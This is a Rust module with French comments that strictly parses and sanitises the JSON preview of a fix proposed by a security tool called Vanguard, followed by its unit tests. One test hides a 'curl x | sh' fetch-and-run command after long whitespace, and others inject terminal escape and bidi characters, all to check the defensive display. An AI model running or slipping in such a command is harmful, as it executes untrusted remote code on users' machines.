//! L'aperçu d'une correction (`correction --voir <jeton> --json`), relu strictement : la dernière ligne non vide,
//! `{"geste": "voir-correction", "issue": "fait", "apercu": {…}, "accord": "<64 chiffres>"}` avec le code 0, ou
//! `{"geste": "voir-correction", "issue": "refuse", "raison": "…"}` avec un autre code. Tout le reste (un autre
//! geste, un autre jeton que celui demandé, une issue qui contredit le code, un champ manquant ou d'un autre type,
//! des listes trop longues) est illisible : la feuille le dit, et rien n'est montré comme si c'était sûr.
//!
//! Un champ inconnu, à n'importe quel niveau, rend aussi la réponse illisible : l'accord engage tout ce que Vanguard
//! a écrit, et un champ ajouté de son côté que la fenêtre ne connaîtrait pas serait engagé sans avoir été montré.
//!
//! L'accord, Vanguard le calcule sur les textes tels qu'il les a écrits ; la fenêtre les montre nettoyés. Si le
//! nettoyage a changé un seul caractère d'un texte montré (un piège, une séquence), `retouche` le dit ; si un texte
//! trop long a été coupé, `coupe` le dit à part (la suite n'est pas montrée). Dans les deux cas, ce qui est montré
//! n'est plus exactement ce que l'accord engage : le prochain lot ne devra pas offrir d'accepter. Limite connue : une
//! lettre sosie (un « а » cyrillique dans un chemin) n'est pas un piège pour le nettoyage, elle passe sans retouche.

use serde::Deserialize;

use super::bilan::Gravite;
use crate::commandes::{Accord, Empreinte};

/// Lignes de commande montrées au plus (une correction de Vanguard en a quelques-unes).
pub const COMMANDES_MAX: usize = 64;
/// Valeurs d'avant montrées au plus.
pub const AVANT_MAX: usize = 64;
/// Longueur d'un nom court (règle, catégorie), en caractères.
const NOM_MAX: usize = 80;
/// Longueur d'une commande ou d'une valeur d'avant, en caractères : bien plus que la ligne de la console (400), pour
/// que la fin d'une commande, souvent ce qui compte, soit montrée ; au-delà, coupée et dit (`coupe`).
const LIGNE_APERCU_MAX: usize = crate::nettoyage::TEXTE_MAX;

/// Qui fera la correction, jugé par Vanguard (`machine::Droits`).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Droits {
    /// Les droits du compte, sans élévation.
    Compte,
    /// Les droits d'administrateur (une fenêtre de mot de passe).
    Admin,
    /// Elle pose une question : elle se fait dans le terminal.
    Terminal,
}

impl Droits {
    fn lire(mot: &str) -> Option<Droits> {
        match mot {
            "compte" => Some(Droits::Compte),
            "admin" => Some(Droits::Admin),
            "terminal" => Some(Droits::Terminal),
            _ => None,
        }
    }
}

/// Une valeur d'avant relevée : ce qui serait changé (« droits:/home/alice/.ssh ») et sa valeur (absente : `None`).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Avant {
    pub geste: String,
    pub valeur: Option<String>,
}

/// L'aperçu prêt à montrer : chaque texte nettoyé et borné. Ses booléens sont des faits indépendants dits par
/// Vanguard (automatique, annulable, point de restauration) et un par la fenêtre (retouche) : pas une machine à états.
#[derive(Clone, Debug, PartialEq, Eq)]
#[allow(clippy::struct_excessive_bools)]
pub struct Apercu {
    pub version: String,
    pub regle: String,
    pub categorie: String,
    pub gravite: Gravite,
    pub message: String,
    pub action: String,
    pub commandes: Vec<String>,
    /// Faux : à faire soi-même, Vanguard ne donne que la marche à suivre.
    pub automatique: bool,
    pub droits: Droits,
    pub annulable: bool,
    /// Pourquoi elle ne s'annulerait pas ; vide si elle s'annule.
    pub pourquoi_pas: String,
    pub avant: Vec<Avant>,
    pub point_de_restauration: bool,
    /// L'accord de Vanguard sur tout ce qu'il a montré, gardé tel quel.
    pub accord: Accord,
    /// Le nettoyage a changé au moins un texte montré : ce qui est montré n'est plus exactement ce que l'accord engage.
    pub retouche: bool,
    /// Au moins un texte trop long a été coupé : sa suite n'est pas montrée.
    pub coupe: bool,
}

/// Ce que la feuille montre de la réponse.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Lecture {
    Lue(Box<Apercu>),
    /// Vanguard a refusé de montrer (le problème a disparu, deux constats répondent…) : sa raison, nettoyée.
    Refusee(String),
    /// La réponse ne se lit pas comme un aperçu de ce jeton : une raison courte.
    Illisible(String),
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct ReponseBrute {
    geste: String,
    issue: String,
    #[serde(default)]
    raison: String,
    #[serde(default)]
    apercu: Option<ApercuBrut>,
    #[serde(default)]
    accord: String,
}

/// Tous les champs sont exigés, avec leur type, et seulement eux : un champ absent, d'un autre type ou inconnu rend la
/// réponse illisible.
#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct ApercuBrut {
    version: String,
    langue: String,
    jeton: String,
    cle: String,
    regle: String,
    categorie: String,
    niveau: String,
    message: String,
    action: String,
    commandes: Vec<String>,
    automatique: bool,
    droits: String,
    annulable: bool,
    pourquoi_pas: String,
    avant: Vec<AvantBrut>,
    point_de_restauration: bool,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct AvantBrut {
    geste: String,
    // Présente, même nulle : un champ oublié n'est pas une valeur « absente » (serde le prendrait pour `None`).
    #[serde(deserialize_with = "presente")]
    valeur: Option<String>,
}

/// Une valeur nulle ou un texte ; sans `default`, serde refuse le champ manquant.
fn presente<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Option<String>, D::Error> {
    <Option<String> as Deserialize>::deserialize(d)
}

/// La gravité, aux quatre mots exacts de Vanguard (ici, un autre mot n'est pas « moyen » : il est illisible).
fn gravite(mot: &str) -> Option<Gravite> {
    matches!(mot, "Info" | "Moyen" | "Eleve" | "Critique")
        .then(|| Gravite::lire(mot))
        .flatten()
}

/// Lit la réponse de `correction --voir <jeton> --json`, pour ce jeton-là et ce code de sortie.
pub fn lire(jeton: Empreinte, code: Option<i32>, sortie: &[u8]) -> Lecture {
    let illisible = |raison: &str| Lecture::Illisible(raison.to_string());
    // La dernière ligne non vide : Vanguard a pu écrire avant elle (un avertissement).
    let Some(ligne) = sortie
        .split(|o| *o == b'\n')
        .rev()
        .find(|l| !l.iter().all(u8::is_ascii_whitespace))
    else {
        return illisible(crate::tr!("Vanguard n'a rien répondu", "Vanguard gave no answer"));
    };
    let Ok(b) = super::lire::<ReponseBrute>(ligne) else {
        return illisible(crate::tr!(
            "réponse de Vanguard illisible",
            "unreadable answer from Vanguard"
        ));
    };
    if b.geste != "voir-correction" {
        return illisible(crate::tr!("réponse d'un autre geste", "answer for another action"));
    }
    match (b.issue.as_str(), code, b.apercu) {
        ("fait", Some(0), Some(a)) if b.raison.is_empty() => apercu(jeton, &a, &b.accord).map_or_else(
            || {
                illisible(crate::tr!(
                    "aperçu de Vanguard mal formé",
                    "malformed preview from Vanguard"
                ))
            },
            |a| Lecture::Lue(Box::new(a)),
        ),
        ("refuse", Some(c), None) if c != 0 => Lecture::Refusee(crate::nettoyage::nom(&b.raison, 200)),
        _ => illisible(crate::tr!(
            "réponse de Vanguard contradictoire",
            "contradictory answer from Vanguard"
        )),
    }
}

/// L'aperçu, strictement : le jeton demandé, une langue, une gravité et des droits connus, un accord de 64 chiffres,
/// des listes bornées. Chaque texte est nettoyé ; un texte changé par le nettoyage pose `retouche`.
fn apercu(jeton: Empreinte, a: &ApercuBrut, accord: &str) -> Option<Apercu> {
    let accord = Accord::lire(accord)?;
    if Empreinte::lire(&a.jeton)? != jeton || !matches!(a.langue.as_str(), "fr" | "en") {
        return None;
    }
    if a.commandes.len() > COMMANDES_MAX || a.avant.len() > AVANT_MAX {
        return None;
    }
    // La clé n'est pas montrée (elle nomme l'objet, déjà dans le message) : seulement bornée.
    if a.cle.chars().count() > crate::nettoyage::TEXTE_MAX {
        return None;
    }
    let gravite = gravite(&a.niveau)?;
    let droits = Droits::lire(&a.droits)?;
    // Nettoyé d'abord, coupé ensuite : chaque écart compté à part (un piège retiré, une suite non montrée).
    let (mut retouche, mut coupe) = (false, false);
    let mut propre = |s: &str, entier: fn(&str) -> String, max: usize| {
        let e = entier(s);
        retouche |= e != s;
        coupe |= e.chars().count() > max;
        crate::nettoyage::couper(&e, max)
    };
    let ligne = crate::nettoyage::ligne_entiere;
    let texte = crate::nettoyage::texte_entier;
    let (version, regle, categorie) = (
        propre(&a.version, ligne, NOM_MAX),
        propre(&a.regle, ligne, NOM_MAX),
        propre(&a.categorie, ligne, NOM_MAX),
    );
    let max = crate::nettoyage::TEXTE_MAX;
    let message = propre(&a.message, texte, max);
    let action = propre(&a.action, texte, max);
    let pourquoi_pas = propre(&a.pourquoi_pas, texte, max);
    let commandes: Vec<String> = a.commandes.iter().map(|c| propre(c, ligne, LIGNE_APERCU_MAX)).collect();
    let avant: Vec<Avant> = a
        .avant
        .iter()
        .map(|v| Avant {
            geste: propre(&v.geste, ligne, LIGNE_APERCU_MAX),
            valeur: v.valeur.as_deref().map(|t| propre(t, ligne, LIGNE_APERCU_MAX)),
        })
        .collect();
    Some(Apercu {
        version,
        regle,
        categorie,
        gravite,
        message,
        action,
        commandes,
        automatique: a.automatique,
        droits,
        annulable: a.annulable,
        pourquoi_pas,
        avant,
        point_de_restauration: a.point_de_restauration,
        accord,
        retouche,
        coupe,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    const JETON: &str = "0123456789abcdef0123456789abcdef";

    fn jeton() -> Empreinte {
        Empreinte::lire(JETON).unwrap()
    }

    fn apercu_json() -> serde_json::Value {
        serde_json::json!({
            "version": "0.99.0", "langue": "fr", "jeton": JETON, "cle": "/home/alice/.ssh", "regle": "SSH-002",
            "categorie": "SSH", "niveau": "Moyen", "message": "Le dossier ~/.ssh est lisible par d'autres comptes.",
            "action": "Retirer la lecture aux autres comptes", "commandes": ["chmod 700 /home/alice/.ssh"],
            "automatique": true, "droits": "compte", "annulable": true, "pourquoi_pas": "",
            "avant": [{"geste": "droits:/home/alice/.ssh", "valeur": "755"}, {"geste": "x", "valeur": null}],
            "point_de_restauration": false
        })
    }

    fn reponse(apercu: &serde_json::Value) -> Vec<u8> {
        let v = serde_json::json!({
            "geste": "voir-correction", "issue": "fait", "raison": "", "apercu": apercu, "accord": "ab".repeat(32)
        });
        format!("un avertissement\n{v}\n\n").into_bytes()
    }

    /// Une réponse bien formée se lit entière, les textes tels quels, sans retouche.
    #[test]
    fn un_apercu_bien_forme_se_lit_entier() {
        let Lecture::Lue(a) = lire(jeton(), Some(0), &reponse(&apercu_json())) else {
            panic!("pas lu");
        };
        assert_eq!(a.regle, "SSH-002");
        assert_eq!(a.gravite, Gravite::Moyenne);
        assert_eq!(a.droits, Droits::Compte);
        assert_eq!(a.commandes, ["chmod 700 /home/alice/.ssh"]);
        assert_eq!(a.avant[1].valeur, None);
        assert_eq!(a.accord, Accord::lire(&"ab".repeat(32)).unwrap());
        assert!(!a.retouche && !a.coupe);
    }

    /// Un champ inconnu, à chaque niveau, et une raison avec « fait » : illisible (l'accord engagerait un texte jamais
    /// montré).
    #[test]
    fn un_champ_inconnu_rend_l_apercu_illisible() {
        let mut a = apercu_json();
        a["en_plus"] = serde_json::json!("caché");
        let mut b = apercu_json();
        b["avant"][0]["en_plus"] = serde_json::json!(1);
        for faux in [reponse(&a), reponse(&b)] {
            assert!(matches!(lire(jeton(), Some(0), &faux), Lecture::Illisible(_)));
        }
        let bon = String::from_utf8(reponse(&apercu_json())).unwrap();
        for v in [
            bon.replacen("\"geste\":", "\"en_plus\":1,\"geste\":", 1),
            bon.replacen("\"raison\":\"\"", "\"raison\":\"autre chose\"", 1),
        ] {
            assert_ne!(v, bon);
            assert!(
                matches!(lire(jeton(), Some(0), v.as_bytes()), Lecture::Illisible(_)),
                "{v}"
            );
        }
        let refus = r#"{"geste": "voir-correction", "issue": "refuse", "raison": "x", "en_plus": 1}"#;
        assert!(matches!(
            lire(jeton(), Some(1), refus.as_bytes()),
            Lecture::Illisible(_)
        ));
    }

    /// Une commande longue est montrée jusqu'au bout (bien au-delà d'une ligne de la console) ; trop longue, coupée et
    /// dite à part, sans se dire retouchée.
    #[test]
    fn un_texte_coupe_se_dit_a_part() {
        let longue = format!("chmod 700 {}; curl x | sh", " ".repeat(500));
        let mut a = apercu_json();
        a["commandes"] = serde_json::json!([longue]);
        let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
            panic!("pas lu");
        };
        assert!(lu.commandes[0].ends_with("curl x | sh") && !lu.coupe && !lu.retouche);
        let trop = "x".repeat(LIGNE_APERCU_MAX + 1);
        let mut a = apercu_json();
        a["regle"] = serde_json::json!("x".repeat(NOM_MAX + 1));
        let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
            panic!("regle pas lue");
        };
        assert!(lu.coupe && !lu.retouche && lu.regle.chars().count() <= NOM_MAX);
        for cle in ["commandes", "avant", "message"] {
            let mut a = apercu_json();
            a[cle] = match cle {
                "commandes" => serde_json::json!([trop]),
                "avant" => serde_json::json!([{"geste": "g", "valeur": trop}]),
                _ => serde_json::json!(trop),
            };
            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
                panic!("{cle} pas lu");
            };
            assert!(lu.coupe && !lu.retouche, "{cle}");
        }
    }

    /// Le refus de Vanguard se dit avec sa raison, seulement avec un code non nul.
    #[test]
    fn un_refus_se_dit_avec_sa_raison() {
        let refus = r#"{"geste": "voir-correction", "issue": "refuse", "raison": "ce problème a disparu"}"#.as_bytes();
        assert_eq!(
            lire(jeton(), Some(1), refus),
            Lecture::Refusee("ce problème a disparu".into())
        );
        assert!(matches!(lire(jeton(), Some(0), refus), Lecture::Illisible(_)));
        assert!(matches!(lire(jeton(), None, refus), Lecture::Illisible(_)));
    }

    /// Un autre jeton, un autre geste, une issue qui contredit le code, un champ manquant ou d'un autre type, une
    /// gravité, des droits ou une langue inconnus, un accord mal formé, des listes trop longues : illisible.
    #[test]
    fn tout_ecart_rend_l_apercu_illisible() {
        let mut faux: Vec<serde_json::Value> = Vec::new();
        for (cle, valeur) in [
            ("jeton", serde_json::json!("f".repeat(32))),
            ("jeton", serde_json::json!(JETON.to_uppercase())),
            ("langue", serde_json::json!("de")),
            ("niveau", serde_json::json!("Grave")),
            ("droits", serde_json::json!("root")),
            ("automatique", serde_json::json!("oui")),
            ("commandes", serde_json::json!("chmod 700 ~")),
            ("commandes", serde_json::json!(vec!["x"; COMMANDES_MAX + 1])),
            (
                "avant",
                serde_json::json!(vec![serde_json::json!({"geste": "x", "valeur": null}); AVANT_MAX + 1]),
            ),
            ("avant", serde_json::json!([{"geste": "x"}])),
            ("message", serde_json::json!(7)),
        ] {
            let mut a = apercu_json();
            a[cle] = valeur;
            faux.push(a);
        }
        for champ in [
            "version",
            "cle",
            "message",
            "commandes",
            "droits",
            "annulable",
            "point_de_restauration",
        ] {
            let mut a = apercu_json();
            a.as_object_mut().unwrap().remove(champ);
            faux.push(a);
        }
        for a in &faux {
            assert!(
                matches!(lire(jeton(), Some(0), &reponse(a)), Lecture::Illisible(_)),
                "{a}"
            );
        }
        let bon = reponse(&apercu_json());
        assert!(matches!(lire(jeton(), Some(1), &bon), Lecture::Illisible(_)));
        let texte = String::from_utf8(bon).unwrap();
        for (de, vers) in [
            ("\"voir-correction\"", "\"retirer\""),
            ("\"fait\"", "\"refuse\""),
            (&"ab".repeat(32), &"ab".repeat(31)),
            (&"ab".repeat(32), &"AB".repeat(32)),
        ] {
            let v = texte.replacen(de, vers, 1);
            assert!(
                matches!(lire(jeton(), Some(0), v.as_bytes()), Lecture::Illisible(_)),
                "{v}"
            );
        }
        for rien in [&b""[..], b"\n\n", b"[1]", b"{\"geste\": 7}"] {
            assert!(matches!(lire(jeton(), Some(0), rien), Lecture::Illisible(_)));
        }
    }

    /// Un texte piégé est montré nettoyé, et l'aperçu se dit retouché.
    #[test]
    fn un_texte_piege_est_nettoye_et_dit() {
        for (cle, piege) in [
            ("message", serde_json::json!("Tout va bien\u{1b}[2K\u{202e}")),
            ("commandes", serde_json::json!(["chmod 700 ~\u{200b}"])),
            ("avant", serde_json::json!([{"geste": "a\nb", "valeur": "1"}])),
            ("regle", serde_json::json!("LNX\u{1b}[31m-001")),
        ] {
            let mut a = apercu_json();
            a[cle] = piege;
            let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
                panic!("{cle} pas lu");
            };
            assert!(lu.retouche, "{cle}");
            for t in std::iter::once(&lu.message)
                .chain(&lu.commandes)
                .chain(lu.avant.iter().map(|v| &v.geste))
            {
                assert!(
                    !t.contains('\u{1b}') && !t.contains('\u{202e}') && !t.contains('\u{200b}'),
                    "{t:?}"
                );
            }
            assert!(lu.avant.iter().all(|v| !v.geste.contains('\n')));
        }
    }
}
